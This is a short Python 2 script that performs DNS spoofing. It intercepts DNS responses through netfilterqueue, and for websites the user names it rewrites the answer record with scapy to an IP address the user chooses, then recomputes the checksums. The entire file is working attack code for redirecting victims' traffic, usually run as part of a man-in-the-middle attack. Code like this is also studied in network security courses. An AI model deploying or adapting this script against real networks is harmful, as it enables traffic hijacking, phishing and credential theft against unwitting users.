
import netfilterqueue
import scapy.all as scapy

spoof_dict = dict()

def website_select():
    print("Provide websites to spoof")
    i = 0
    input_ip = "-1"
    input_website = "-1"
    while True:
        try:
            input_website = raw_input("Provide website #" + str(i) + " address")
            print(input_website)
            if input_website is "":
                break
            input_ip = raw_input("Provide ip #" + str(i) + " address")
            if input_ip is "":
                break
            spoof_dict[input_website] = input_ip
            i+=1
        except Exception as e:
            print(e)
            break
    print(spoof_dict)
    return spoof_dict


def on_packet_captured(packet):
    spkt = scapy.IP(packet.get_payload())
    if spkt.haslayer(scapy.DNSRR):
        qname = spkt[scapy.DNSQR].qname
        for website in spoof_dict.keys():
            if website in qname:
                new_packet = modify_packet(spkt, qname, spoof_dict[website])
                packet.set_payload(str(new_packet))
                break
    packet.accept()

def modify_packet(pkt, spoof_name, spoof_ip):
    print(spoof_ip)
    pkt[scapy.DNS].an = scapy.DNSRR(rrname = spoof_name, rdata = spoof_ip) #replace response part of dns packet
    pkt[scapy.DNS].ancount = 1 #always 1 response included
    #del and recompute checksums
    del pkt[scapy.IP].len
    del pkt[scapy.IP].chksum
    del pkt[scapy.UDP].len
    del pkt[scapy.UDP].chksum
    pkt.show2(dump=True)
    return pkt    




def start():
    website_select()
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, on_packet_captured)
    queue.run()

def read_input():
    website_select()
